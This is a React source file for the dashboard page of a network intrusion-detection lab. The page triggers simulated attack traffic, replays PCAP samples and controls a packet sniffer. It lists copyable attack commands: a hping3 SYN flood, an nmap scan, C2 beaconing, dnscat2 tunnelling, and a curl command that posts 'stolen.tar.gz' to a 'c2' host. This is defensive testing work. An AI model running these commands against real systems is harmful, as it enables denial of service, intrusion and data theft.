'use client'

import React, { useState, useEffect } from 'react'
import { 
  Skull, Target, Zap, Activity, Wifi, Radio, Upload, Play, 
  CheckCircle2, Shield, RefreshCw, HelpCircle, BookOpen, Terminal, 
  ChevronDown, ChevronUp, Lock, Cpu, FileCode, Server, Network, 
  Copy, Check, FileUp, Pause
} from 'lucide-react'
import PacketFlowCanvas from '@/components/PacketFlowCanvas'
import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/Card'
import { Badge, BadgeVariant } from '@/components/ui/Badge'
import { Button } from '@/components/ui/Button'

const ATTACKS = [
  {
    type: 'uni_directional', name: 'Volumetric SYN Flood (DDoS)', vector: 'VECTOR (a)', metric: 'SYN Asymmetry Ratio (R → inf)', icon: Wifi,
    kali: 'hping3 -S -p 80 --flood 10.0.1.50',
    desc: 'Fires high-rate simplex SYN packets to blackholed targets with 0 SYN-ACK return packets.',
    variant: 'critical' as BadgeVariant
  },
  {
    type: 'c2_beacon', name: 'Botnet C2 Periodic Beaconing', vector: 'VECTOR (b)', metric: 'IAT Periodicity CV < 0.5', icon: Activity,
    kali: 'sliver-client beacon --interval 10s',
    desc: 'Generates robotic periodic heartbeats with low Inter-Arrival Time variation (CV < 0.5).',
    variant: 'warning' as BadgeVariant
  },
  {
    type: 'dns_tunnel', name: 'Covert DGA & DNS Tunnelling', vector: 'VECTOR (c)', metric: 'Shannon Entropy H > 3.8', icon: Network,
    kali: 'dnscat2 --dns domain=exfil.covert.lab',
    desc: 'Transmits high-entropy domain queries to test covert channel and DGA detection over gateway.',
    variant: 'info' as BadgeVariant
  },
  {
    type: 'tls_anomaly', name: 'Encrypted Session Malware', vector: 'VECTOR (d)', metric: 'Zero-Decryption JA3/JA4 Hash', icon: Lock,
    kali: 'curl -k --tls-max 1.2 https://target:8443',
    desc: 'Transmits TLS ClientHello frames with abnormal cipher metadata without payload decryption.',
    variant: 'neutral' as BadgeVariant
  },
  {
    type: 'port_scan', name: 'Simplex Reconnaissance Scan', vector: 'VECTOR (e)', metric: 'Port Fan-Out Cardinality > 20', icon: Target,
    kali: 'nmap -sS -Pn -p 1-150 10.0.1.99',
    desc: 'Simulates rapid sequential port probing (1-150) across simplex tap without waiting for handshakes.',
    variant: 'warning' as BadgeVariant
  },
  {
    type: 'exfiltration', name: 'Asymmetric Data Exfiltration', vector: 'VECTOR (f)', metric: 'Directional Volume Ratio > 10:1', icon: Skull,
    kali: 'curl -X POST -d @stolen.tar.gz http://c2:9000',
    desc: 'Fires bulk outbound payload bursts with large volume asymmetry and zero return ACKs.',
    variant: 'critical' as BadgeVariant
  },
]

const PCAP_SAMPLES = [
  { name: 'syn_flood.pcap', label: 'Volumetric SYN Flood', category: 'VECTOR_A', size: '55.9 KB' },
  { name: 'real_port_scan.pcap', label: 'Real Port Scan', category: 'VECTOR_E', size: '2.8 KB' },
  { name: 'dns_tunnel.pcap', label: 'DNS Covert Tunnel', category: 'VECTOR_C', size: '3.1 KB' },
  { name: 'rigid_beacon.pcap', label: 'C2 Rigid Heartbeat', category: 'VECTOR_B', size: '764 B' },
  { name: 'udp_flood.pcap', label: 'UDP Simplex Flood', category: 'VECTOR_A', size: '543 KB' },
  { name: 'stealth_scan.pcap', label: 'Stealth Slow Scan', category: 'VECTOR_E', size: '2.8 KB' },
]

export default function ActionCenterPage() {
  const [loading, setLoading] = useState<string | null>(null)
  const [results, setResults] = useState<{type: string, msg: string, attack: string}[]>([])
  const [snifferStats, setSnifferStats] = useState<any>({ is_running: false, packets_captured: 0, bytes_captured: 0, interface: 'default' })
  const [uploading, setUploading] = useState(false)
  const [isExplainerOpen, setIsExplainerOpen] = useState(false)
  const [explainerTab, setExplainerTab] = useState<'pcap' | 'visualizer' | 'sniffer'>('pcap')
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null)

  const fetchSniffer = async () => {
    try {
      const res = await fetch('http://localhost:8000/api/network/sniffer/status')
      if (res.ok) setSnifferStats(await res.json())
    } catch {}
  }

  useEffect(() => {
    fetchSniffer()
    const interval = setInterval(fetchSniffer, 3000)
    return () => clearInterval(interval)
  }, [])

  const triggerAttack = async (type: string) => {
    setLoading(type)
    try {
      const res = await fetch(`http://localhost:8000/api/simulate/${type}`, { method: 'POST' })
      if (res.ok) {
        setResults(prev => [{ type: 'success', msg: `${type.replace(/_/g, ' ').toUpperCase()} triggered. Raw packets transmitted on wire. Check Live Stream.`, attack: type }, ...prev].slice(0, 6))
      } else {
        setResults(prev => [{ type: 'error', msg: `Failed: ${res.statusText}`, attack: type }, ...prev].slice(0, 6))
      }
    } catch {
      setResults(prev => [{ type: 'error', msg: 'Network error reaching backend gateway.', attack: type }, ...prev].slice(0, 6))
    } finally {
      setLoading(null)
    }
  }

  const triggerPcapReplay = async (sampleName: string) => {
    setLoading(sampleName)
    try {
      const res = await fetch(`http://localhost:8000/api/network/pcap/replay/${sampleName}`, { method: 'POST' })
      if (res.ok) {
        setResults(prev => [{ type: 'success', msg: `PCAP Replay Started: ${sampleName}. Genuine raw packet stream entering Scapy/Zeek pipeline.`, attack: sampleName }, ...prev].slice(0, 6))
      } else {
        setResults(prev => [{ type: 'error', msg: `Failed replaying ${sampleName}: ${res.statusText}`, attack: sampleName }, ...prev].slice(0, 6))
      }
    } catch {
      setResults(prev => [{ type: 'error', msg: 'Network error reaching backend.', attack: sampleName }, ...prev].slice(0, 6))
    } finally {
      setLoading(null)
    }
  }

  const toggleSniffer = async () => {
    try {
      if (snifferStats.is_running) {
        const res = await fetch('http://localhost:8000/api/network/sniffer/stop', { method: 'POST' })
        if (res.ok) {
          const data = await res.json()
          setResults(prev => [{ type: 'success', msg: `Live Sniffer Stopped. Captured ${data.packets_captured} packets (${data.bytes_captured} bytes).`, attack: 'sniffer' }, ...prev])
        }
      } else {
        const res = await fetch('http://localhost:8000/api/network/sniffer/start', { method: 'POST' })
        if (res.ok) {
          setResults(prev => [{ type: 'success', msg: 'Passive Line-Rate Network Sniffer Started. Promiscuously capturing real IP traffic.', attack: 'sniffer' }, ...prev])
        }
      }
      fetchSniffer()
    } catch {
      setResults(prev => [{ type: 'error', msg: 'Network error toggling sniffer.', attack: 'sniffer' }, ...prev])
    }
  }

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    setUploading(true)
    const formData = new FormData()
    formData.append('file', file)
    try {
      const res = await fetch('http://localhost:8000/api/network/pcap/upload', {
        method: 'POST',
        body: formData,
      })
      if (res.ok) {
        const data = await res.json()
        setResults(prev => [{ type: 'success', msg: `Custom PCAP Uploaded (${data.filename} - ${data.size_bytes} bytes). Processing through ML pipeline...`, attack: file.name }, ...prev])
      } else {
        setResults(prev => [{ type: 'error', msg: `Upload failed: ${res.statusText}`, attack: file.name }, ...prev])
      }
    } catch {
      setResults(prev => [{ type: 'error', msg: 'Failed uploading PCAP file.', attack: file.name }, ...prev])
    } finally {
      setUploading(false)
      e.target.value = ''
    }
  }

  const copyKaliCmd = (cmd: string) => {
    navigator.clipboard.writeText(cmd)
    setCopiedCmd(cmd)
    setTimeout(() => setCopiedCmd(null), 2000)
  }

  return (
    <div className="space-y-6 max-w-[1500px] mx-auto animate-in fade-in duration-300 font-mono">
      {/* PAGE HEADER */}
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 border-b border-white/[0.06] pb-4">
        <div>
          <h1 className="text-base font-bold tracking-tight text-white font-mono uppercase flex items-center gap-2">
            <Skull className="w-4 h-4 text-red-400" />
            NTRO Unidirectional Traffic Replay & Ingestion Lab
          </h1>
          <p className="text-xs text-zinc-400 mt-0.5">
            Replay authentic defense PCAPs, manage passive line-rate network sniffing, or inject raw socket attack streams across the data diode tap.
          </p>
        </div>

        <Button
          variant="outline"
          size="sm"
          onClick={() => setIsExplainerOpen(!isExplainerOpen)}
          icon={<BookOpen className="w-3.5 h-3.5 text-blue-400" />}
        >
          {isExplainerOpen ? 'Hide Architecture Guide' : 'Architecture & Physics Guide'}
        </Button>
      </div>

      {/* ARCHITECTURE & PHYSICS EXPLAINER DRAWER */}
      {isExplainerOpen && (
        <Card className="border-blue-500/20 bg-[#0e121b]">
          <CardHeader className="py-3 px-4 flex-row justify-between items-center space-y-0">
            <div className="flex items-center gap-2 text-xs font-bold text-zinc-200">
              <BookOpen className="w-4 h-4 text-blue-400" />
              <span>NTRO PS #26145 System Architecture & Optical Diode Physics Reference</span>
            </div>
            <div className="flex p-0.5 bg-[#090a0d] border border-white/[0.08] rounded">
              {(['pcap', 'visualizer', 'sniffer'] as const).map((tab) => (
                <button
                  key={tab}
                  onClick={() => setExplainerTab(tab)}
                  className={`px-2.5 py-1 rounded text-[11px] font-mono transition-all cursor-pointer ${
                    explainerTab === tab
                      ? 'bg-blue-600/30 text-blue-300 font-semibold border border-blue-500/40'
                      : 'text-zinc-400 hover:text-zinc-200'
                  }`}
                >
                  {tab === 'pcap' ? '1. PCAP Replay' : tab === 'visualizer' ? '2. Diode Visualizer' : '3. Live Sniffer'}
                </button>
              ))}
            </div>
          </CardHeader>
          <CardContent className="p-4 pt-2 text-xs space-y-3 font-sans">
            {explainerTab === 'pcap' && (
              <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Disk Repository</span>
                  <code className="text-blue-400 text-xs font-mono block">data/pcaps/ (24 Samples)</code>
                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Mounted into backend at <code className="text-zinc-300 font-mono">/app/data/pcaps</code> for native socket injection.</p>
                </div>
                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Streaming Engine</span>
                  <span className="text-emerald-400 font-bold text-xs font-mono block">Scapy PcapReader Streaming</span>
                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Streams frame-by-frame into sliding 5s tumbling windows without buffer overflow.</p>
                </div>
                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Zero-Simulation Invariant</span>
                  <span className="text-amber-400 font-bold text-xs font-mono block">Exact Wire Entropy & Timing</span>
                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Computes Shannon entropy $H$, IAT $CV$, and XGBoost v5 ML inference over raw payloads.</p>
                </div>
              </div>
            )}
            {explainerTab === 'visualizer' && (
              <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Stage 1: Attacker WAN</span>
                  <span className="text-red-400 font-bold text-xs font-mono block">185.220.101.34 (Kali Tools)</span>
                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Adversary fires unidirectional packets (hping3, nmap, dnscat2) towards enclave.</p>
                </div>
                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Stage 2: Optical Tap</span>
                  <span className="text-purple-400 font-bold text-xs font-mono block">Simplex Optical Barrier</span>
                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Photons flow strictly Left-to-Right. Return fiber physically absent: <strong>0 Return ACKs / 0 RSTs</strong>.</p>
                </div>
                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Stage 3: Sentinel Enclave</span>
                  <span className="text-emerald-400 font-bold text-xs font-mono block">Rx Sensor on eth0</span>
                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Receives light pulses, decodes L2-L4 headers, evaluates entropy and classifies threats.</p>
                </div>
              </div>
            )}
            {explainerTab === 'sniffer' && (
              <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Interface Binding</span>
                  <code className="text-emerald-400 text-xs font-mono block">Promiscuous eth0 Socket</code>
                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Opens raw L2 AF_PACKET socket to capture all incoming unicast, multicast, and broadcast frames.</p>
                </div>
                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Line-Rate Filtering</span>
                  <span className="text-blue-400 font-bold text-xs font-mono block">In-Memory Scapy Parser</span>
                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Extracts inter-arrival intervals, port fan-outs, and domain query lengths with zero blocking.</p>
                </div>
                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Live Alert Broadcast</span>
                  <span className="text-amber-400 font-bold text-xs font-mono block">WebSocket & Fast Event Bus</span>
                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Pushes detected anomalies to the live stream canvas and MongoDB incident ledger in real time.</p>
                </div>
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {/* NOTIFICATION FEED */}
      {results.length > 0 && (
        <div className="space-y-1.5">
          {results.map((r, i) => (
            <div
              key={i}
              className={`p-2.5 rounded border text-xs font-mono flex items-center justify-between ${
                r.type === 'success'
                  ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-300'
                  : 'bg-red-500/10 border-red-500/20 text-red-300'
              }`}
            >
              <div className="flex items-center gap-2">
                <span className={`w-1.5 h-1.5 rounded-full ${r.type === 'success' ? 'bg-emerald-400' : 'bg-red-400'}`} />
                <span>{r.msg}</span>
              </div>
              <span className="text-[10px] text-zinc-500 uppercase">{r.attack}</span>
            </div>
          ))}
        </div>
      )}

      {/* REAL-TIME SIMPLEX CANVAS */}
      <PacketFlowCanvas />

      {/* SNIFFER & PCAP UPLOAD DUAL CONTROLS */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {/* Passive Sniffer Control Card */}
        <Card>
          <CardHeader className="py-3 px-4 flex-row justify-between items-center space-y-0">
            <div className="flex items-center gap-2">
              <Terminal className="w-4 h-4 text-emerald-400" />
              <CardTitle>Passive Line-Rate Network Sniffer</CardTitle>
            </div>
            <Badge variant={snifferStats.is_running ? 'secure' : 'neutral'} size="xs" dot>
              {snifferStats.is_running ? 'SNIFFING ACTIVE' : 'STOPPED'}
            </Badge>
          </CardHeader>
          <CardContent className="p-4 space-y-3">
            <div className="grid grid-cols-3 gap-2 text-xs">
              <div className="p-2.5 rounded bg-[#0d0f14] border border-white/[0.06]">
                <span className="text-[10px] text-zinc-500 uppercase block font-semibold">Interface</span>
                <span className="text-xs font-bold text-zinc-200 mt-0.5 block">{snifferStats.interface || 'eth0'}</span>
              </div>
              <div className="p-2.5 rounded bg-[#0d0f14] border border-white/[0.06]">
                <span className="text-[10px] text-zinc-500 uppercase block font-semibold">Packets</span>
                <span className="text-xs font-bold text-blue-400 mt-0.5 block">{snifferStats.packets_captured || 0}</span>
              </div>
              <div className="p-2.5 rounded bg-[#0d0f14] border border-white/[0.06]">
                <span className="text-[10px] text-zinc-500 uppercase block font-semibold">Bytes Captured</span>
                <span className="text-xs font-bold text-emerald-400 mt-0.5 block">
                  {Math.round((snifferStats.bytes_captured || 0) / 1024)} KB
                </span>
              </div>
            </div>

            <Button
              variant={snifferStats.is_running ? 'danger' : 'primary'}
              size="sm"
              className="w-full"
              onClick={toggleSniffer}
              icon={snifferStats.is_running ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
            >
              {snifferStats.is_running ? 'Stop Line-Rate Sniffer' : 'Start Promiscuous Line-Rate Sniffer (eth0)'}
            </Button>
          </CardContent>
        </Card>

        {/* Custom PCAP Upload Dropzone */}
        <Card>
          <CardHeader className="py-3 px-4">
            <div className="flex items-center gap-2">
              <Upload className="w-4 h-4 text-blue-400" />
              <CardTitle>Ingest External PCAP Capture File</CardTitle>
            </div>
          </CardHeader>
          <CardContent className="p-4 space-y-3">
            <label className="border-2 border-dashed border-white/[0.12] hover:border-blue-500/50 rounded-lg p-5 flex flex-col items-center justify-center cursor-pointer transition-colors bg-[#0d0f14]/50">
              <FileUp className="w-6 h-6 text-zinc-500 mb-2" />
              <span className="text-xs font-medium text-zinc-300">
                {uploading ? 'Processing capture file...' : 'Drop PCAP file here or browse disk'}
              </span>
              <span className="text-[10px] text-zinc-500 mt-1">Accepts standard .pcap or .pcapng files up to 500 MB</span>
              <input
                type="file"
                accept=".pcap,.pcapng"
                onChange={handleFileUpload}
                disabled={uploading}
                className="hidden"
              />
            </label>
          </CardContent>
        </Card>
      </div>

      {/* 6-VECTOR RAW SOCKET PROBING GRID */}
      <div className="space-y-3 pt-2">
        <div className="flex items-center justify-between">
          <h2 className="text-xs font-semibold uppercase tracking-wider text-zinc-400 font-mono flex items-center gap-2">
            <Zap className="w-3.5 h-3.5 text-amber-400" />
            Active Raw Socket Simplex Probing Lab (Vectors a-f)
          </h2>
          <span className="text-[11px] text-zinc-500 font-mono">Live kernel raw socket injection</span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3.5">
          {ATTACKS.map((atk) => {
            const Icon = atk.icon
            const isTrig = loading === atk.type
            return (
              <Card key={atk.type} className="flex flex-col justify-between">
                <CardHeader className="py-3 px-4">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-zinc-100 flex items-center gap-2">
                      <Icon className="w-3.5 h-3.5 text-blue-400" />
                      {atk.name}
                    </span>
                    <Badge variant={atk.variant} size="xs">
                      {atk.vector}
                    </Badge>
                  </div>
                </CardHeader>
                <CardContent className="p-4 pt-2 space-y-3 text-xs">
                  <p className="text-zinc-400 text-[11px] font-sans leading-relaxed">{atk.desc}</p>
                  
                  <div className="p-2 rounded bg-[#090b0e] border border-white/[0.06] flex items-center justify-between">
                    <code className="text-[11px] text-zinc-300 truncate font-mono">{atk.kali}</code>
                    <button
                      onClick={() => copyKaliCmd(atk.kali)}
                      className="text-zinc-500 hover:text-zinc-300 p-1 cursor-pointer"
                      title="Copy Kali Command"
                    >
                      {copiedCmd === atk.kali ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                    </button>
                  </div>

                  <div className="flex items-center justify-between pt-1 border-t border-white/[0.06] text-[10px]">
                    <span className="text-zinc-500 uppercase">{atk.metric}</span>
                    <Button
                      variant="outline"
                      size="xs"
                      loading={isTrig}
                      onClick={() => triggerAttack(atk.type)}
                      icon={<Play className="w-3 h-3 text-red-400" />}
                    >
                      Trigger Burst
                    </Button>
                  </div>
                </CardContent>
              </Card>
            )
          })}
        </div>
      </div>

      {/* AUTHENTIC DEFENSE PCAP REPLAY GALLERY */}
      <div className="space-y-3 pt-2">
        <div className="flex items-center justify-between">
          <h2 className="text-xs font-semibold uppercase tracking-wider text-zinc-400 font-mono flex items-center gap-2">
            <FileCode className="w-3.5 h-3.5 text-blue-400" />
            Authentic Attack PCAP Replay Pipeline (Zero-Simulation)
          </h2>
          <span className="text-[11px] text-zinc-500 font-mono">24 authentic defense captures</span>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2.5">
          {PCAP_SAMPLES.map((sample) => {
            const isReplaying = loading === sample.name
            return (
              <div
                key={sample.name}
                className="p-3 rounded-lg border border-white/[0.08] bg-[#111318] hover:bg-white/[0.03] flex flex-col justify-between transition-colors"
              >
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <Badge variant="neutral" size="xs">{sample.category}</Badge>
                    <span className="text-[10px] text-zinc-500">{sample.size}</span>
                  </div>
                  <div className="text-xs font-bold text-zinc-200 mt-1 truncate">{sample.label}</div>
                  <code className="text-[10px] text-zinc-500 font-mono block truncate mt-0.5">{sample.name}</code>
                </div>

                <div className="mt-3 pt-2 border-t border-white/[0.06]">
                  <Button
                    variant="outline"
                    size="xs"
                    className="w-full"
                    loading={isReplaying}
                    onClick={() => triggerPcapReplay(sample.name)}
                    icon={<Play className="w-3 h-3 text-blue-400" />}
                  >
                    Replay
                  </Button>
                </div>
              </div>
            )
          })}
        </div>
      </div>
    </div>
  )
}
